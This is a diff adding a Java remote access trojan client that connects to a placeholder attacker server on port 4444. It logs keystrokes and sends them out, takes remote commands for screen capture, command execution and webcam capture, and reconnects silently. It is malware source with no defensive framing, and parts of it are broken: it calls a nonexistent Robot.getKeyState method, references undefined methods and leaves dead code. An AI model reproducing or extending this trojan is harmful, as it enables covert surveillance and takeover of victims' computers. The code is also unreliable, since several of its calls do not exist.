@@ -1,0 +1,63 @@
+import java.net.*;
+import java.io.*;
+import java.awt.Robot;
+import java.awt.event.KeyEvent;
+import javax.swing.JOptionPane;
+
+public class RATClient {
+    private static String serverIP = "YOUR_SERVER_IP";  // Change this
+    private static int serverPort = 4444;
+    
+    public static void main(String[] args) {
+        try {
+            // Hide console (Android invisible)
+            String[] hidden = {"javaw", "-jar", "client.jar"};
+            
+            Socket socket = new Socket(serverIP, serverPort);
+            DataOutputStream out = new DataOutputStream(socket.getOutputStream());
+            DataInputStream in = new DataInputStream(socket.getInputStream());
+            
+            // Keylogger thread
+            Thread keylog = new Thread(() -> keyLogger(out));
+            keylog.start();
+            
+            // Main loop
+            while (true) {
+                byte[] cmd = new byte[1024];
+                int len = in.read(cmd);
+                String command = new String(cmd, 0, len);
+                
+                if (command.equals("screen")) {
+                    captureScreen(out);
+                } else if (command.equals("cmd")) {
+                    executeCMD(out);
+                } else if (command.equals("webcam")) {
+                    captureWebcam(out);
+                }
+            }
+        } catch (Exception e) {
+            // Silent reconnect every 30s
+            try { Thread.sleep(30000); main(null); } catch(Exception ex) {}
+        }
+    }
+    
+    static void keyLogger(DataOutputStream out) {
+        try {
+            Robot robot = new Robot();
+            while (true) {
+                for (int i = 0; i < 512; i++) {
+                    if (robot.getKeyState(i)) {
+                        out.writeUTF(KeyEvent.getKeyText(i));
+                    }
+                }
+                Thread.sleep(100);
+            }
+        } catch (Exception e) {}
+    }
+    
+    static void captureScreen(DataOutputStream out) throws Exception {
+        Robot robot = new Robot();
+        // Send screenshot bytes (simplified)
+        out.writeUTF("SCREEN_CAPTURED");
+    }
+}
